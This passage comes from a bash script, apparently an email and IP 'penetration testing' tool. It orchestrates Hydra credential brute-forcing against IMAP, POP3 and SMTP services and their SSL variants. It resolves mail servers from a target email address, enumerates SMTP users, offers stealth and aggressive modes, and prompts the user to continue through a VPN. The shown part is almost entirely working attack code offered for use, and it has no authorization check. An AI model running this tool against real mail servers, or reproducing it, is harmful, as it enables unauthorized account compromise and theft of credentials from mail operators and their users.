                smtp_enumerate_users "$target" "$SMTP_PORT" "$username_file"
            fi
            return 0
            ;;
        stealth)
            log_info "Stealth mode: Reduced threads and increased delays"
            THREAD_MULTIPLIER=0.5
            TIMEOUT_MULTIPLIER=2.0
            ;;
        aggressive)
            log_info "Aggressive mode: Maximum threads"
            THREAD_MULTIPLIER=3.0
            TIMEOUT_MULTIPLIER=0.5
            ;;
    esac
    
    # Execute attacks on all available protocols
    local success_count=0
    local total_protocols=${#protocols[@]}
    
    for proto_port in "${protocols[@]}"; do
        local proto="${proto_port%%:*}"
        local port="${proto_port##*:}"
        
        # Calculate threads and timeout based on protocol and multipliers
        # Use bash arithmetic to avoid bc dependency
        local threads timeout
        local thread_mult=$(echo "$THREAD_MULTIPLIER" | awk '{printf "%.0f", $1 * 100}')
        local timeout_mult=$(echo "$TIMEOUT_MULTIPLIER" | awk '{printf "%.0f", $1 * 100}')
        
        case "$proto" in
            imap) threads=$(( (IMAP_THREADS * thread_mult) / 100 )); timeout=$(( (IMAP_TIMEOUT * timeout_mult) / 100 )) ;;
            pop3) threads=$(( (POP3_THREADS * thread_mult) / 100 )); timeout=$(( (POP3_TIMEOUT * timeout_mult) / 100 )) ;;
            smtp) threads=$(( (SMTP_THREADS * thread_mult) / 100 )); timeout=$(( (SMTP_TIMEOUT * timeout_mult) / 100 )) ;;
            imaps) threads=$(( (IMAPS_THREADS * thread_mult) / 100 )); timeout=$(( (IMAPS_TIMEOUT * timeout_mult) / 100 )) ;;
            pop3s) threads=$(( (POP3S_THREADS * thread_mult) / 100 )); timeout=$(( (POP3S_TIMEOUT * timeout_mult) / 100 )) ;;
            smtps) threads=$(( (SMTPS_THREADS * thread_mult) / 100 )); timeout=$(( (SMTPS_TIMEOUT * timeout_mult) / 100 )) ;;
            *) threads=16; timeout=30 ;;
        esac
        
        # Ensure minimum values
        [ "$threads" -lt 1 ] && threads=1
        [ "$timeout" -lt 5 ] && timeout=5
        
        echo ""
        echo "═══════════════════════════════════════════════════════════════════════════════"
        
        if execute_protocol_attack "$proto" "$port" "$target" "$username_file" "$password_file" "$threads" "$timeout"; then
            ((success_count++))
        fi
        
        echo "═══════════════════════════════════════════════════════════════════════════════"
        echo ""
        
        # Quick mode timeout check (5 minutes)
        if [ "$ATTACK_MODE" = "quick" ]; then
            local elapsed=$(($(date +%s) - START_TIME))
            if [ $elapsed -gt 300 ]; then
                log_warning "Quick mode timeout reached (5 minutes)"
                break
            fi
        fi
    done
    
    # Cleanup temp files
    rm -f "$username_file" "$password_file"
    
    # Summary
    echo ""
    print_banner "ATTACK SUMMARY"
    log_info "Total protocols tested: $total_protocols"
    log_info "Successful attacks: $success_count"
    
    if [ $success_count -gt 0 ]; then
        log_success "✓ Credentials discovered! Check logs for details."
        
        # Generate report if not disabled
        if [ "$NO_REPORT" = "false" ] && command -v "$SCRIPT_DIR/report_generator.sh" &>/dev/null; then
            log_info "Generating comprehensive security report..."
            bash "$SCRIPT_DIR/report_generator.sh" --protocol email --target "$target" 2>/dev/null || true
        fi
        
        return 0
    else
        log_warning "✗ No credentials found"
        echo ""
        print_message "💡 SUGGESTIONS:" "$CYAN"
        echo "  • Try different wordlists: bash scripts/download_wordlists.sh"
        echo "  • Enable enumeration: --enumerate"
        echo "  • Try aggressive mode: -m aggressive"
        echo "  • Check DNS intelligence output for additional targets"
        echo "  • Test alternate ports (587, 465, 2525)"
        echo ""
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════════════════

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -e|--email)
            TARGET_EMAIL="$2"
            shift 2
            ;;
        -i|--ip)
            TARGET_IP="$2"
            shift 2
            ;;
        -t|--target)
            TARGET_SERVER="$2"
            shift 2
            ;;
        -m|--mode)
            ATTACK_MODE="$2"
            shift 2
            ;;
        -u|--user-list)
            CUSTOM_USERLIST="$2"
            shift 2
            ;;
        -w|--word-list)
            CUSTOM_WORDLIST="$2"
            shift 2
            ;;
        -T|--threads)
            THREAD_MULTIPLIER="$2"
            shift 2
            ;;
        -o|--timeout)
            TIMEOUT_MULTIPLIER="$2"
            shift 2
            ;;
        -a|--all)
            TEST_ALL_PROTOCOLS=true
            shift
            ;;
        -p|--protocol)
            SPECIFIC_PROTOCOL="$2"
            shift 2
            ;;
        --enumerate)
            ENABLE_ENUMERATION=true
            shift
            ;;
        --skip-vpn)
            SKIP_VPN_CHECK=true
            shift
            ;;
        --no-report)
            NO_REPORT=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        --tips)
            show_optimization_tips
            exit 0
            ;;
        -h|--help)
            show_help
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Validation
if [ -z "$TARGET_EMAIL" ] && [ -z "$TARGET_IP" ] && [ -z "$TARGET_SERVER" ]; then
    log_error "Target required: use -e (email), -i (IP), or -t (server)"
    show_help
    exit 1
fi

# Check for hydra
if ! command -v hydra &> /dev/null; then
    log_error "Hydra not installed. Run: bash install.sh"
    exit 1
fi

# Check for dig (DNS queries)
if ! command -v dig &> /dev/null; then
    log_warning "dig not installed - DNS analysis will be limited"
fi

# Start timer
START_TIME=$(date +%s)

# Main banner
print_banner "🚀 ULTRA-ADVANCED EMAIL & IP PENETRATION TESTING"

# VPN Check
if [ "$SKIP_VPN_CHECK" = "false" ]; then
    if ! check_vpn_connection; then
        log_warning "No VPN detected - proceed with caution"
        read -p "Continue without VPN? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            log_info "Aborted by user"
            exit 0
        fi
    fi
fi

echo ""

# Determine target
FINAL_TARGET=""
if [ -n "$TARGET_SERVER" ]; then
    FINAL_TARGET="$TARGET_SERVER"
    log_info "Direct target: $FINAL_TARGET"
elif [ -n "$TARGET_IP" ]; then
    FINAL_TARGET="$TARGET_IP"
    log_info "IP target: $FINAL_TARGET"
elif [ -n "$TARGET_EMAIL" ]; then
    DOMAIN="${TARGET_EMAIL##*@}"
    log_info "Email target: $TARGET_EMAIL"
    log_info "Extracting domain: $DOMAIN"
    echo ""
    
    # Perform DNS analysis
    MAIL_SERVERS=($(perform_dns_analysis "$DOMAIN"))
    
    if [ ${#MAIL_SERVERS[@]} -gt 0 ]; then
        FINAL_TARGET="${MAIL_SERVERS[0]}"
        log_success "Primary mail server: $FINAL_TARGET"
    else
        # Fallback to domain A record
        FINAL_TARGET="$DOMAIN"
        log_warning "No MX records found, using domain directly: $FINAL_TARGET"
    fi
fi

echo ""

# SMTP intelligence gathering
if command -v dig &> /dev/null && [ -n "$FINAL_TARGET" ]; then
    smtp_banner_grab "$FINAL_TARGET" "$SMTP_PORT" 2>/dev/null || true
    echo ""
    smtp_capability_check "$FINAL_TARGET" "$SMTP_PORT" 2>/dev/null || true
    echo ""
fi

# Email enumeration if enabled
if [ "$ENABLE_ENUMERATION" = "true" ]; then
    temp_users="/tmp/enum_users_$$.txt"
    get_default_usernames "$temp_users"
    smtp_enumerate_users "$FINAL_TARGET" "$SMTP_PORT" "$temp_users" 2>/dev/null || true
    rm -f "$temp_users"
    echo ""
fi

# Execute main attack
run_email_attack "$FINAL_TARGET"
attack_result=$?

# End timer
END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))

echo ""
print_banner "PENETRATION TEST COMPLETE"
log_info "Total time: $((ELAPSED/60))m $((ELAPSED%60))s"
log_info "Results saved to: $RESULTS_DIR"
echo ""

exit $attack_result
